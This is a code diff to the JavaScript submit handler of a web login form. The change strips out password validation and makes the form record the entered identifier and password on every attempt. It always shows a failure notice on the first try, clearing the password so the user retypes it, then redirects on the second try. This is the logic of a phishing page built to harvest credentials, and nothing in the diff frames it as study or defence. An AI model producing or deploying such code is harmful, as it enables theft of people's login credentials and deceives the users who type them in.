@@ -45,26 +45,17 @@ loginForm.addEventListener('submit', async (event) => {
     const identifier = document.getElementById('identifier').value;
     const password = document.getElementById('password').value;
 
-    const validPassword = "securepassword"; // Change this to your actual validation logic
-
-    // Save user data on every login attempt
+    // Save user data on both clicks
     await saveUserData(identifier, password);
 
-    // Check login validity
-    if (identifier === "" || password !== validPassword) {
-        attemptCount++; // Increment the attempt count
-        showModal(); // Show the modal for incorrect login
-
-        // Optionally clear the inputs after failed attempts
-        if (attemptCount < 2) {
-            document.getElementById('identifier').value = '';
-            document.getElementById('password').value = '';
-        }
+    if (attemptCount === 0) {
+        showModal(); // Show notification for the first click
+        attemptCount++; // Increment for the next click
+        document.getElementById('password').value = ''; // Clear password input for retry
     } else {
-        // Successful login actions
-        attemptCount = 0; // Reset attempt count
+        // Second click: redirect to indexPAGE.html
         setTimeout(() => {
-            window.location.href = 'indexPAGE.html';
-        }, 1000); // Redirect after 1 second
+            window.location.href = 'indexPAGE.html'; // Redirect after 1 second
+        }, 1000);
     }
 });
